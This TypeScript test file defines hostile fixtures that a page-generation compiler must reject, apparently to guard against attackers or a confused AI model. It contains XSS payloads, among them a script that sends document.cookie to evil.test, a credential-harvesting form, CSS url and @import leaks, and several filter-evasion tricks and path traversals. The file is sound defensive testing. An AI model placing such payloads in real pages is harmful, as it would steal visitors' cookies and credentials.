/**
 * Hostile fixtures: bundles that must never compile.
 *
 * Each entry names the *stage* expected to refuse it and the *code* expected to
 * appear. Asserting the code, not merely "it failed", is what stops this corpus
 * from rotting: a bundle rejected for the wrong reason is a gate that has
 * stopped testing what its name claims, and a size budget that accidentally
 * catches an XSS attempt is not an XSS defence.
 *
 * These are conformance cases. The sandbox would neutralise most of them
 * regardless — see reject.ts on why that does not make refusing them pointless.
 */

import type { CodegenStage } from "./compile";
import { CODEGEN_ENVELOPE_VERSION } from "./envelope";

export interface HostileFixture {
  name: string;
  /** What an attacker or a confused model is trying to achieve. */
  intent: string;
  stage: CodegenStage;
  code: string;
  bundle: unknown;
}

const wrap = (bodyHtml: string, css = "") => ({
  version: CODEGEN_ENVELOPE_VERSION,
  css,
  routes: [{ path: "/", title: "Hostile", bodyHtml }],
});

export const HOSTILE_FIXTURES: readonly HostileFixture[] = [
  /* ── executable content ──────────────────────────────────────────────── */
  {
    name: "inline-script",
    intent: "Run script in the preview frame.",
    stage: "reject",
    code: "script_tag",
    bundle: wrap(`<div><script>fetch('https://evil.test/'+document.cookie)</script></div>`),
  },
  {
    name: "script-split-case",
    intent: "Evade a case-sensitive substring check.",
    stage: "reject",
    code: "script_tag",
    bundle: wrap(`<div><ScRiPt>alert(1)</ScRiPt></div>`),
  },
  {
    name: "event-handler",
    intent: "Execute on user interaction rather than on load.",
    stage: "reject",
    code: "event_handler",
    bundle: wrap(`<div onclick="alert(1)">Tap</div>`),
  },
  {
    name: "event-handler-unquoted",
    intent: "Hide a handler behind unusual attribute spacing.",
    stage: "reject",
    code: "event_handler",
    bundle: wrap(`<div  onmouseover = alert(1) >Hover</div>`),
  },
  {
    name: "javascript-href",
    intent: "Script via a link target.",
    stage: "reject",
    code: "js_url",
    bundle: wrap(`<a href="javascript:alert(1)">Go</a>`),
  },
  {
    name: "svg-vector",
    intent: "Use foreign content, where HTML parsing rules differ.",
    stage: "reject",
    code: "svg_tag",
    bundle: wrap(`<svg><desc>x</desc></svg>`),
  },

  /* ── escaping the shell ──────────────────────────────────────────────── */
  {
    name: "style-element-escape",
    intent: "Close the shell's <style> early and continue as markup.",
    stage: "reject",
    code: "style_escape",
    bundle: wrap(`<p>copy</p>`, `.a{color:red}</style><script>alert(1)</script><style>`),
  },
  {
    name: "css-import",
    intent: "Pull a stylesheet from the network.",
    stage: "reject",
    code: "css_import",
    bundle: wrap(`<p>copy</p>`, `@import url('https://evil.test/x.css');`),
  },
  {
    name: "css-url-exfiltration",
    intent: "Leak by requesting a URL from CSS.",
    stage: "reject",
    code: "css_url",
    bundle: wrap(`<p>copy</p>`, `.a{background:url(https://evil.test/pixel.png)}`),
  },
  {
    name: "css-unicode-escape",
    intent: "Hide a forbidden keyword behind CSS escapes.",
    stage: "reject",
    code: "css_escape",
    bundle: wrap(`<p>copy</p>`, `.a{background:\\75 rl(https://evil.test/p.png)}`),
  },
  {
    name: "document-shell-injection",
    intent: "Supply a whole document and take over the shell.",
    stage: "reject",
    code: "doctype",
    bundle: wrap(`<!doctype html><html><head></head><body>hi</body></html>`),
  },
  {
    name: "nested-frame",
    intent: "Nest a frame that might inherit weaker policy.",
    stage: "reject",
    code: "frame_tag",
    bundle: wrap(`<iframe src="https://evil.test/"></iframe>`),
  },
  {
    name: "meta-csp-override",
    intent: "Declare a second, weaker policy.",
    stage: "reject",
    code: "meta_tag",
    bundle: wrap(`<meta http-equiv="Content-Security-Policy" content="default-src *">`),
  },
  {
    name: "base-tag",
    intent: "Repoint every relative URL in the document.",
    stage: "reject",
    code: "base_tag",
    bundle: wrap(`<base href="https://evil.test/">`),
  },

  /* ── data exfiltration and phishing surface ──────────────────────────── */
  {
    name: "credential-form",
    intent: "Collect credentials in something that looks like a real login.",
    stage: "reject",
    code: "form_tag",
    bundle: wrap(`<form action="https://evil.test/steal"><input name="password"></form>`),
  },
  {
    name: "external-link",
    intent: "Send the visitor off-site from generated markup.",
    stage: "reject",
    code: "href_not_internal",
    bundle: wrap(`<a href="https://evil.test/">Continue</a>`),
  },
  {
    name: "protocol-relative-link",
    intent: "Reach the network via a scheme-relative URL.",
    stage: "reject",
    code: "href_not_internal",
    bundle: wrap(`<a href="//evil.test/x">Continue</a>`),
  },
  {
    name: "html-comment",
    intent: "Use a construct whose parsing this scanner does not model.",
    stage: "reject",
    code: "comment",
    bundle: wrap(`<div><!-- --><script>alert(1)</script> --></div>`),
  },

  /* ── structural abuse ────────────────────────────────────────────────── */
  {
    name: "style-attribute",
    intent: "Style outside the stylesheet, where CSS is not scanned.",
    stage: "reject",
    code: "attribute_not_allowed",
    bundle: wrap(`<div style="background:url(https://evil.test/p.png)">x</div>`),
  },
  {
    name: "unbalanced-markup",
    intent: "Leave the tree open so the shell's own structure absorbs it.",
    stage: "reject",
    code: "unbalanced_tag",
    bundle: wrap(`<div><section><p>copy</p></div>`),
  },
  {
    name: "stray-angle-bracket",
    intent: "Exploit lenient parsing of a bare '<'.",
    stage: "reject",
    code: "unparseable_markup",
    bundle: wrap(`<p>5 < 6 and here is <notatag attr</p>`),
  },
  {
    name: "depth-bomb",
    intent: "Exhaust the renderer with nesting.",
    stage: "reject",
    code: "budget_depth",
    bundle: wrap(`${"<div>".repeat(40)}deep${"</div>".repeat(40)}`),
  },
  {
    name: "element-flood",
    intent: "Exhaust the renderer with node count.",
    stage: "reject",
    code: "budget_elements",
    bundle: wrap(`<div>${"<span></span>".repeat(2_000)}</div>`),
  },
  {
    name: "oversize-body",
    intent: "Overrun the per-route byte budget.",
    stage: "budget",
    code: "budget_body",
    bundle: wrap(`<p>${"pad ".repeat(20_000)}</p>`),
  },
  {
    name: "oversize-css",
    intent: "Overrun the stylesheet byte budget.",
    stage: "budget",
    code: "budget_css",
    bundle: wrap(`<p>copy</p>`, `.a{color:red}\n${"/* ".repeat(0)}${"a".repeat(41_000)}`),
  },

  /* ── envelope abuse ──────────────────────────────────────────────────── */
  {
    name: "unknown-envelope-key",
    intent: "Smuggle a field the pipeline might later honour.",
    stage: "envelope",
    code: "unknown_key",
    bundle: { version: CODEGEN_ENVELOPE_VERSION, css: "", routes: [{ path: "/", title: "t", bodyHtml: "<p>x</p>" }], script: "alert(1)" },
  },
  {
    name: "external-route-path",
    intent: "Make a route that is really an off-site URL.",
    stage: "envelope",
    code: "bad_path",
    bundle: { version: CODEGEN_ENVELOPE_VERSION, css: "", routes: [{ path: "https://evil.test/", title: "t", bodyHtml: "<p>x</p>" }] },
  },
  {
    name: "traversal-route-path",
    intent: "Escape the route namespace.",
    stage: "envelope",
    code: "bad_path",
    bundle: { version: CODEGEN_ENVELOPE_VERSION, css: "", routes: [{ path: "/../../etc/passwd", title: "t", bodyHtml: "<p>x</p>" }] },
  },
  {
    name: "wrong-version",
    intent: "Target an older or future contract.",
    stage: "envelope",
    code: "bad_version",
    bundle: { version: "codegen-0", css: "", routes: [{ path: "/", title: "t", bodyHtml: "<p>x</p>" }] },
  },

  /* ── media: arbitrary sources ────────────────────────────────────────── */
  {
    name: "img-element",
    intent: "Write an image element and therefore a src of its own choosing.",
    stage: "reject",
    code: "tag_not_allowed",
    bundle: wrap(`<img src="https://evil.test/track.png" alt="x">`),
  },
  {
    name: "img-data-uri",
    intent: "Supply image bytes directly instead of naming a trusted asset.",
    stage: "reject",
    code: "tag_not_allowed",
    bundle: wrap(`<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">`),
  },
  {
    name: "src-attribute",
    intent: "Attach a source to a permitted element.",
    stage: "reject",
    code: "attribute_not_allowed",
    bundle: wrap(`<span src="https://evil.test/p.png">x</span>`),
  },
  {
    name: "srcset-attribute",
    intent: "Name a second source through a responsive-image attribute.",
    stage: "reject",
    code: "attribute_not_allowed",
    bundle: wrap(`<span srcset="https://evil.test/p.png 2x">x</span>`),
  },
  {
    name: "picture-source",
    intent: "Use <source> inside the permitted <picture> element.",
    stage: "reject",
    code: "tag_not_allowed",
    bundle: wrap(`<picture><source srcset="https://evil.test/p.png"></picture>`),
  },
  {
    name: "css-background-image",
    intent: "Fetch an image from the stylesheet instead of the markup.",
    stage: "reject",
    code: "css_url",
    bundle: wrap(`<div class="a">x</div>`, `.a{background-image:url("https://evil.test/p.png")}`),
  },
  {
    name: "media-token-with-url",
    intent: "Pass a URL where an asset name is expected.",
    stage: "reject",
    code: "bad_asset_id",
    bundle: wrap(`<span data-ventrio-media="https://evil.test/p.png"></span>`),
  },
  {
    name: "media-token-with-data-uri",
    intent: "Pass image bytes where an asset name is expected.",
    stage: "reject",
    code: "bad_asset_id",
    bundle: wrap(`<span data-ventrio-media="data:image/png;base64,iVBORw0KGgo="></span>`),
  },
  {
    name: "unknown-asset-token",
    intent: "Name an asset that is not in the registry.",
    stage: "reject",
    code: "unknown_asset",
    bundle: wrap(`<span data-ventrio-media="hero.not_registered"></span>`),
  },
  {
    name: "media-token-traversal",
    intent: "Escape the registry namespace with a path.",
    stage: "reject",
    code: "bad_asset_id",
    bundle: wrap(`<span data-ventrio-media="../../secrets/key"></span>`),
  },
  {
    // Markup characters in the value, without a literal <script> — otherwise
    // the whole-string script check fires first and this stops testing the
    // thing it is named after.
    name: "media-token-attribute-escape",
    intent: "Smuggle markup through the token value to escape the attribute.",
    stage: "reject",
    code: "bad_asset_id",
    bundle: wrap(`<span data-ventrio-media="a<em>b</em>"></span>`),
  },
  {
    name: "media-token-handler-smuggle",
    intent: "Hide an event handler inside the token value.",
    stage: "reject",
    code: "event_handler",
    bundle: wrap(`<span data-ventrio-media="bench.surface" onerror="alert(1)"></span>`),
  },
  {
    name: "media-token-script-smuggle",
    intent: "Hide a script element inside the token value.",
    stage: "reject",
    code: "script_tag",
    bundle: wrap(`<span data-ventrio-media="a"><script>alert(1)</script></span>`),
  },
  {
    name: "media-on-wrong-element",
    intent: "Put the token where the compiler's replacement is ambiguous.",
    stage: "reject",
    code: "media_wrong_element",
    bundle: wrap(`<div data-ventrio-media="bench.surface"></div>`),
  },
  {
    name: "media-span-with-children",
    intent: "Hide markup inside the element the compiler will replace.",
    stage: "media",
    code: "media_not_expandable",
    bundle: wrap(`<span data-ventrio-media="bench.surface"><em>{{ventrio:text:brand.name}}</em></span>`),
  },
  {
    name: "reserved-namespace-squat",
    intent: "Invent a compiler directive the gate does not yet know about.",
    stage: "reject",
    code: "reserved_attribute",
    bundle: wrap(`<span data-ventrio-src="https://evil.test/p.png">x</span>`),
  },

  /* ── media: composition honesty ──────────────────────────────────────── */
  {
    name: "split-without-media",
    intent: "Reserve a visual column with nothing to put in it.",
    stage: "reject",
    code: "layout_without_media",
    bundle: wrap(`<section data-ventrio-layout="split"><h1>Headline</h1><p>copy</p></section>`),
  },
  {
    name: "overlap-without-media",
    intent: "Ask for an overlap composition with no asset.",
    stage: "reject",
    code: "layout_without_media",
    bundle: wrap(`<section data-ventrio-layout="overlap"><p>copy</p></section>`),
  },
  {
    name: "bleed-without-media",
    intent: "Ask for a full-bleed media band with no media.",
    stage: "reject",
    code: "layout_without_media",
    bundle: wrap(`<section data-ventrio-layout="bleed"><h2>x</h2></section>`),
  },
  {
    name: "unknown-layout",
    intent: "Invent a layout the shell has no geometry for.",
    stage: "reject",
    code: "unknown_layout",
    bundle: wrap(`<section data-ventrio-layout="hero-grid-v2"><p>copy</p></section>`),
  },

  /* ── content-token abuse ─────────────────────────────────────────────── */
  {
    name: "unknown-content-token",
    intent: "Reference copy that was never supplied.",
    stage: "substitution",
    code: "unknown_token",
    bundle: wrap(`<h1>{{ventrio:text:pricing.enterprise_discount}}</h1>`),
  },
  {
    // Caught by the literal-copy rule before substitution ever runs: a
    // malformed token is, by definition, words that are not a token. The
    // `malformed_token` guard still covers titles, which the markup scanner
    // does not walk — see the title case in the test file.
    name: "malformed-content-token",
    intent: "Emit template syntax that silently survives to the page.",
    stage: "reject",
    code: "literal_copy",
    bundle: wrap(`<h1>{{ventrio:text:Hero Title}}</h1>`),
  },
  {
    name: "literal-copy-invented-label",
    intent: "Write words the content pack never supplied.",
    stage: "reject",
    code: "literal_copy",
    bundle: wrap(`<p><span>01 / MISMATCH</span>{{ventrio:text:brand.name}}</p>`),
  },
  {
    name: "literal-copy-renamed-plan",
    intent: "Rename the product's plan — the canary actually did this.",
    stage: "reject",
    code: "literal_copy",
    bundle: wrap(`<h3>Solo Maker</h3>`),
  },
];
